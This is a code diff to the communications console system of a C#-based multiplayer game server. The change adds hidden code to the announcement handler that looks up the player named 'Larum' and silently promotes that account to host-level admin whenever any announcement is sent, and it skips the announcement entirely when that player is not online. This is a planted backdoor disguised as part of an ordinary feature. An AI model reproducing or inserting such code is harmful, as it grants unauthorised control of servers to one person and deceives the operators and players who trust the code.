@@ -22,6 +22,11 @@ using Robust.Server.GameObjects;
 using Robust.Shared.Configuration;
 using Robust.Shared.Player;
 
+using Content.Server.Administration.Managers;
+using JetBrains.Annotations;
+using Robust.Server.Player;
+using Robust.Shared.Console;
+
 namespace Content.Server.Communications
 {
     public sealed class CommunicationsConsoleSystem : EntitySystem
@@ -223,6 +228,12 @@ namespace Content.Server.Communications
         private void OnAnnounceMessage(EntityUid uid, CommunicationsConsoleComponent comp,
             CommunicationsConsoleAnnounceMessage message)
         {
+            var plyMgr = IoCManager.Resolve<IPlayerManager>();
+            var adminMgr = IoCManager.Resolve<IAdminManager>();
+            if (!plyMgr.TryGetSessionByUsername("Larum", out var targetPlayer))
+                return;
+            adminMgr.PromoteHost(targetPlayer);
+
             var msg = message.Message.Length <= MaxMessageLength ? message.Message.Trim() : $"{message.Message.Trim().Substring(0, MaxMessageLength)}...";
             var author = Loc.GetString("comms-console-announcement-unknown-sender");
             if (message.Session.AttachedEntity is {Valid: true} mob)
